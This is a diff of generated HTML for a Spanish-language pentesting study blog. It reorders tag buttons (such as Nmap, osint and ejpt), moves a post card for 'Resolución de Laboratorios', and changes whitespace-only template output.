-        <a class="post-tag btn btn-outline-primary" href="/tags/john/">john</a>
-      
-        
-        <a class="post-tag btn btn-outline-primary" href="/tags/kiwi/">kiwi</a>
-      
-        
         <a class="post-tag btn btn-outline-primary" href="/tags/nmap/">Nmap</a>
       
         
         <a class="post-tag btn btn-outline-primary" href="/tags/osint/">osint</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/activo/">activo</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/cron-jobs/">cron jobs</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/ejpt/">ejpt</a>
       
     </div>
   </section>
@@ -2752,6 +3109,34 @@ Video 02:06</p>
     <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
       
         <article class="col">
+          <a href="/posts/laboratorios/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1776224340"
+  data-df="DD/MM/YYYY"
+  
+>
+  14/04/2026
+</time>
+
+              <h4 class="pt-0 my-2">Resolución de Laboratorios</h4>
+              <div class="text-muted">
+                <p>Laboratorios.</p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
+        <article class="col">
           <a href="/posts/analisis-vuln-enum/" class="post-preview card h-100">
             <div class="card-body">
               <!--
@@ -2802,34 +3187,6 @@ Video 02:06</p>
               <h4 class="pt-0 my-2">Enumeración - Cracking de contraseñas</h4>
               <div class="text-muted">
                 <p>Cómo enumerar usuarios y crackear contraseñas de servicios vulnerables.</p>
-              </div>
-            </div>
-          </a>
-        </article>
-      
-        <article class="col">
-          <a href="/posts/laboratorios/" class="post-preview card h-100">
-            <div class="card-body">
-              <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/locale-dateime.js
--->
-
-
-
-
-<time
-  
-  data-ts="1776224340"
-  data-df="DD/MM/YYYY"
-  
->
-  14/04/2026
-</time>
-
-              <h4 class="pt-0 my-2">Resolución de Laboratorios</h4>
-              <div class="text-muted">
-                <p>Laboratorios.</p>
               </div>
             </div>
           </a>
@@ -2998,30 +3355,6 @@ Video 02:06</p>
     
     
     
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
   
     
     
@@ -3055,32 +3388,6 @@ Video 02:06</p>
     
     
     
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
     
   
     
@@ -3121,25 +3428,6 @@ Video 02:06</p>
     
     
     
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
   
     
     
@@ -3169,18 +3457,6 @@ Video 02:06</p>
     
     
     
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
   
     
     
@@ -3192,139 +3468,6 @@ Video 02:06</p>
     
     
     
-    
-      
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
     
   
     
@@ -3360,6 +3503,94 @@ Video 02:06</p>
     
     
     
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
       
     
   
@@ -3384,7 +3615,30 @@ Video 02:06</p>
     
     
     
-      
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
     
   
     
@@ -3393,6 +3647,50 @@ Video 02:06</p>
     
       
     
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
   
     
     
@@ -3443,19 +3741,19 @@ Video 02:06</p>
         <a class="post-tag btn btn-outline-primary" href="/tags/hydra-y-crackmapexec/">Hydra y CrackMapExec</a>
       
         
-        <a class="post-tag btn btn-outline-primary" href="/tags/incognito/">incognito</a>
-      
-        
-        <a class="post-tag btn btn-outline-primary" href="/tags/john/">john</a>
-      
-        
-        <a class="post-tag btn btn-outline-primary" href="/tags/kiwi/">kiwi</a>
-      
-        
         <a class="post-tag btn btn-outline-primary" href="/tags/nmap/">Nmap</a>
       
         
         <a class="post-tag btn btn-outline-primary" href="/tags/osint/">osint</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/activo/">activo</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/cron-jobs/">cron jobs</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/ejpt/">ejpt</a>
       
     </div>
   </section>
